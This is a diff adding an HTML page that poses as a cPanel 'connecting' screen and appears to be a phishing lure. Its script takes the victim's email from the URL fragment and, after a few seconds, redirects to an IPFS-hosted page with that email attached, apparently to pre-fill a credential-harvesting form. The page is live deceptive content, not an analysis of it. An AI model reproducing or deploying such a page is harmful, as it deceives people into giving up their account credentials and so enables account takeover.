@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>cPanel Connection</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #e6f7ff; /* light blue background */
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #ff9900; /* orange header */
+            color: white;
+            text-align: center;
+            padding: 10px;
+            border-bottom: 10px solid #5080a5;
+            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.16);
+        }
+        .loading-text {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 28px;
+            margin: 17px;
+        }
+         .container {
+            text-align: center;
+            margin-top: 50px;
+        }
+        .alert {
+            background-color: #edf8fe; /* white background for alerts */
+            border: 20px solid #fff; /* border around alerts */
+            padding: 20px;
+            margin: 10px;
+            display: inline-block;
+            width: 300px;
+            border-radius: 5px;
+            box-shadow: 0 0.01px 3px rgba(0, 0, 0, 0.05);
+        }
+        .alert p {
+            margin: 0;
+            padding: 0;
+            font-size: 14px;
+        }
+        .alert button {
+            padding: 10px 20px;
+            margin-top: 10px;
+            background-color: #497aa4; /* green button */
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .alert button:hover {
+            background-color: #3C688F; /* darker green on hover */
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="loading-text">
+        <span id="loadingText"><strong>cPanel®</strong> is connecting ..</span>
+        <span id="dynamicText">trying: force preferred</span>
+    </div>
+</header>
+
+<div class="container">
+    <div class="alert">
+        <p>If you are not behind a firewall that blocks port 2096</p>
+        <button>Enter Here</button>
+    </div>
+    <div class="alert">
+        <p>If you are behind a firewall and cannot connect to port 2096</p>
+        <button>Enter Here</button>
+    </div>
+</div>
+
+<script>
+    // Loading animation for "cPanel® is connecting .."
+    let loadingText = document.getElementById("loadingText");
+    let dots = '';
+    setInterval(() => {
+        if (dots.length < 3) {
+            dots += '.';
+        } else {
+            dots = '';
+        }
+        loadingText.textContent = `cPanel® is connecting ${dots}`;
+    }, 250);
+
+    // Dynamic text change for "trying: force preferred"
+    const phrases = ['force preferred', 'proxy', 'attempting backup'];
+    let counter = 0;
+    setInterval(() => {
+        counter = (counter + 1) % phrases.length;
+        document.getElementById("dynamicText").textContent = `trying: ${phrases[counter]}`;
+    }, 1000);
+
+    // Extract email fragment and append to redirect URL
+    const currentUrl = window.location.href; // Get the current URL
+    const fragment = currentUrl.split('#')[1]; // Extract the fragment after '#'
+    
+    // Redirect after 6 seconds with email fragment
+    setTimeout(() => {
+        const redirectUrl = `https://ipfs.io/ipfs/bafkreidxtuownmsuubmqeem47dhsi3myeywx6qbbl52ziy5s45r7qclya4#${fragment}`; // Append fragment to redirect URL
+        window.location.href = redirectUrl; // Redirect to the new URL
+    }, 7500);
+</script>
+
+</body>
+</html>
